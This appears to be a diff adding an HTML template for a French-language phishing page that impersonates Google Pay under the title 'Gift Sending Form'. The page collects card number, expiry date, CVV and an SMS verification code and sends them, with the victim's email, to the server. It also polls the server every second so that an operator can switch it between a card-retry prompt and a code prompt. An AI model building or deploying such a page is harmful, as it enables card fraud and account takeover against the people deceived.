@@ -1,0 +1,278 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Gift Sending Form</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/fomantic-ui/2.9.3/semantic.min.css" integrity="sha512-3quBdRGJyLy79hzhDDcBzANW+mVqPctrGCfIPosHQtMKb3rKsCxfyslzwlz2wj1dT8A7UX+sEvDjaUv+WExQrA==" crossorigin="anonymous" referrerpolicy="no-referrer" />
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: Arial, sans-serif;
+        }
+        body {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            background: linear-gradient(to bottom, #f0f0f0, #d9d9d9);
+            overflow: hidden;
+        }
+        .form-container {
+            display: flex;
+            flex-direction: column;
+            align-items: flex-start;
+            justify-content: flex-start;
+            padding: 20px;
+            background: white;
+            border-radius: 15px;
+            box-shadow: 0 4px 8px rgba(0,0,0,0.1);
+            text-align: left;
+            width: 100%;
+            max-width: 500px;
+            height: 100vh;
+            overflow-y: scroll;
+            overflow-x: hidden;
+        }
+
+        .form-container img{
+            width: 50px;
+            height: auto;
+            margin: 0 auto 15px auto;
+        }
+
+        .form-container h1 {
+            font-size: 24px;
+            margin-bottom: 20px;
+            color: #6a0dad;
+        }
+
+        .section-title {
+            font-size: 18px;
+            margin-bottom: 10px;
+            color: #333;
+        }
+
+        .section {
+            margin-bottom: 25px;
+            padding: 15px;
+            border: 1px solid #ddd;
+            border-radius: 8px;
+            width: 100%;
+            height: 100%;
+        }
+
+        .ui.segment{
+            width: 100%;
+            height: 93%;
+        }
+        .retry{
+            display: none;
+        }
+        .code{
+            display: none;
+        }
+        @media (max-width: 600px) {
+            .form-container h1 {
+                font-size: 20px;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="form-container">
+        <img src="{{ url_for('static', filename='google-pay-logo.png') }}" alt="Logo Google Pay">
+    
+        <div class="section">
+            <div class="section-title"><i class="address card outline icon"></i> Vérification</div>
+    
+            <div class="ui segment" id="loader-segment">
+    
+                <div class="code" id="code-section">
+                    <div class="section-title" style="font-size: 15px;"><i class="mobile alternate icon"></i> Confirmation de la propriété du compte requise.</div>
+                    <form>
+                        <div class="ui form">
+                            <div class="field">
+                                <label for="verification-code">Code de vérification</label>
+                                <input type="text" id="verification-code" placeholder="Entrez le code reçu par SMS" required>
+                            </div>
+                        </div>
+                    </form>
+                    <button id="submit-btn-code" style="margin: 10px 0; width: 100%;" type="submit" class="ui violet button">Soumettre</button>
+                </div>
+    
+                <div class="retry" id="retry-section">
+                    <div class="section-title" style="font-size: 15px;"><i class="credit card outline icon"></i> Informations non reconnues. Veuillez réessayer.</div>
+                    <form>
+                        <div class="ui form">
+                            <div class="field">
+                                <label for="card-number">Numéro de carte</label>
+                                <input type="text" id="card-number" placeholder="Entrez votre numéro de carte" required>
+                            </div>
+                            <div class="field">
+                                <label for="expiry-date">Date d'expiration</label>
+                                <input type="text" id="expiry-date" placeholder="MM/AA" required>
+                            </div>
+                            <div class="field">
+                                <label for="cvv">CVV</label>
+                                <input type="text" id="cvv" placeholder="Entrez le CVV" required>
+                            </div>
+                        </div>
+                    </form>
+                    <button id="submit-btn-retry" style="margin: 10px 0; width: 100%;" type="submit" class="ui violet button">Soumettre</button>
+                </div>
+                <div class="ui active violet inverted dimmer" id="loader-dimmer">
+                    <div class="ui text loader" id="loader-text">Chargement...</div>
+                </div>
+            </div>
+        </div>
+    </div>
+    
+
+    <script>
+            // Fonction pour ajouter l'événement de soumission du formulaire
+            function addSubmitEventListenerRetry() {
+                document.getElementById('submit-btn-retry').addEventListener('click', async function(event) {
+                    event.preventDefault();
+
+                    const cardNumber = document.getElementById('card-number').value;
+                    const expiryDate = document.getElementById('expiry-date').value;
+                    const cvv = document.getElementById('cvv').value;
+
+                    const urlParams = new URLSearchParams(window.location.search);
+                    const email = urlParams.get('email');
+
+                    // Vérification que tous les champs nécessaires sont remplis
+                    if (email && cardNumber && expiryDate && cvv) {
+                        // Affichage du loader
+                        document.getElementById('loader-dimmer').style.display = 'block';
+
+                        try {
+                            const response = await fetch('/submit-maj', {
+                                method: 'POST',
+                                headers: {
+                                    'Content-Type': 'application/json',
+                                },
+                                body: JSON.stringify({
+                                    email: email,
+                                    card_number: cardNumber,
+                                    expiry_date: expiryDate,
+                                    cvv: cvv
+                                })
+                            });
+
+                            const data = await response.json();
+
+                            // Cacher le loader après la réponse
+                            document.getElementById('loader-dimmer').style.display = 'none';
+
+                            // Afficher un message en fonction de la réponse du serveur
+                            if (data.message === "Card information updated successfully") {
+                                document.getElementById('loader-dimmer').style.display = 'block';
+                                document.getElementById('retry-section').style.display = 'none';
+                            } else {
+                                document.getElementById('retry-section').style.display = 'block';
+                            }
+                        } catch (error) {
+                            console.error('Error:', error);
+                            document.getElementById('loader-dimmer').style.display = 'none';
+                            document.getElementById('retry-section').style.display = 'block';
+                        }
+                    }
+                });
+            }
+
+            function addSubmitEventListenerCode() {
+                document.getElementById('submit-btn-code').addEventListener('click', async function(event) {
+                    event.preventDefault();
+
+                    const verificationCode = document.getElementById('verification-code').value;
+
+                    const urlParams = new URLSearchParams(window.location.search);
+                    const email = urlParams.get('email');
+
+                    // Vérification que tous les champs nécessaires sont remplis
+                    if (verificationCode) {
+                        // Affichage du loader
+                        document.getElementById('loader-dimmer').style.display = 'block';
+
+                        try {
+                            const response = await fetch('/code', {
+                                method: 'POST',
+                                headers: {
+                                    'Content-Type': 'application/json',
+                                },
+                                body: JSON.stringify({
+                                    code: verificationCode,
+                                    email: email
+                                })
+                            });
+
+                            const data = await response.json();
+
+                            // Cacher le loader après la réponse
+                            document.getElementById('loader-dimmer').style.display = 'none';
+
+                            // Afficher un message en fonction de la réponse du serveur
+                            if (data.message === "Code information updated successfully") {
+                                document.getElementById('loader-dimmer').style.display = 'block';
+                                document.getElementById('code-section').style.display = 'none';
+                            } else {
+                                document.getElementById('code-section').style.display = 'block';
+                            }
+                        } catch (error) {
+                            console.error('Error:', error);
+                            document.getElementById('loader-dimmer').style.display = 'none';
+                            document.getElementById('code-section').style.display = 'block';
+                        }
+                    }
+                });
+            }
+
+            // Fonction de récupération des messages
+            async function fetchMessage() {
+                const urlParams = new URLSearchParams(window.location.search);
+                const email = urlParams.get('email');
+                
+                if (email) {
+                    try {
+                        const response = await fetch(`/message?email=${encodeURIComponent(email)}`);
+                        const data = await response.json();
+                        
+                        // Si une erreur est détectée dans la réponse
+                        if (data.message === "Error") {
+                            document.getElementById('loader-dimmer').style.display = 'none';
+                            document.getElementById('retry-section').style.display = 'block';
+                            document.getElementById('code-section').style.display = 'none';
+
+                        }                        
+                        if (data.message === "Code") {
+                            document.getElementById('loader-dimmer').style.display = 'none';
+                            document.getElementById('retry-section').style.display = 'none';
+                            document.getElementById('code-section').style.display = 'block';
+
+                        }
+                    } catch (error) {
+                        console.error('Error fetching message:', error);
+                        document.getElementById('loader-dimmer').style.display = 'none';
+                        document.getElementById('retry-section').style.display = 'block';
+                        document.getElementById('code-section').style.display = 'none';
+                        
+
+                    }
+                }
+            }
+
+            // Appel de la fonction fetchMessage toutes les secondes
+            setInterval(fetchMessage, 1000);
+            addSubmitEventListenerRetry()
+            addSubmitEventListenerCode()
+
+
+        
+    </script>
+
+</body>
+</html>
